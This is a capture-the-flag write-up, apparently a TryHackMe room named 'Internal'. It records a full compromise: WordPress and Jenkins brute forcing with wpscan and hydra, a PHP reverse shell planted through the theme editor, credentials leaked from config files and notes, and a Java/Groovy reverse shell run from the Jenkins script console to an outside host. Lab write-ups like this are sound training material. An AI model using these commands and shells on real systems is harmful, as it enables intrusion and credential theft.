# Internal 

> VOiD | Sunday 23 January 2022 05:46:35 AM UTC

My IP : 10.8.253.221
Target IP : 10.10.239.9 [internal.th,]


## PORT 80 [http]
```bash
http://internal.thm/http://internal.thm/
syn-ack Apache httpd 2.4.29 ((Ubuntu))


http://internal.thm/blog/ 		- Wordpress site
http://internal.thm/wordpress/ 	- Wordpress Confirmed

wpscan -e ap,u -t 10 --detection-mode aggressive --url http://internal.thm/blog/ | tee wp.log 

wpscan -U admin -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/blog/ 

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys



http://internal.thm/blog/index.php/2020/08/03/5/
Posted on August 3, 2020 by admin
Private:

To-Do

Don’t forget to reset Will’s credentials. william:arnold147

http://internal.thm/blog/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen
put reverse shell 
http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php
```

PORT   STATE         SERVICE
68/udp open|filtered dhcpc

## USER [www-data]
```bash
linpeas.sh

aubrean+  1524  0.8 11.9 2587808 242296 ?      Sl   05:48   0:25          _ java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war
root      1444  0.0  0.1 404800  3396 ?        Sl   05:48   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080

docker is running on the system

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 68 Aug  3  2020 /var/lib/phpmyadmin/blowfish_secret.inc.php
-rw-r----- 1 root www-data 0 Aug  3  2020 /var/lib/phpmyadmin/config.inc.php

-rw-r----- 1 root www-data 527 Aug  3  2020 /etc/phpmyadmin/config-db.php

$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';

-rw-r----- 1 root www-data 8 Aug  3  2020 /etc/phpmyadmin/htpasswd.setup

www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

```

## USER [aubreanna]
```bash
ssh aubreanna@10.10.239.9 -L 8080:172.17.0.2:8080   

Internal Jenkins service is running on 172.17.0.2:8080

aubreanna@internal:~$ cat user.txt 
THM{int3rna1_fl4g_1}

http://localhost:8080/login?from=%2F

hydra -l admin -V -t 40 -P /usr/share/wordlists/rockyou.txt localhost http-post-form -s 8080 "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"

[8080][http-post-form] host: localhost   login: admin   password: spongebob



http://localhost:8080/script

String host="10.10.239.9";
int port=4444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};
p.destroy();
s.close();


jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123

```

## USER [root]
```bash
root@internal:~# cat root.txt 
THM{d0ck3r_d3str0y3r}


```
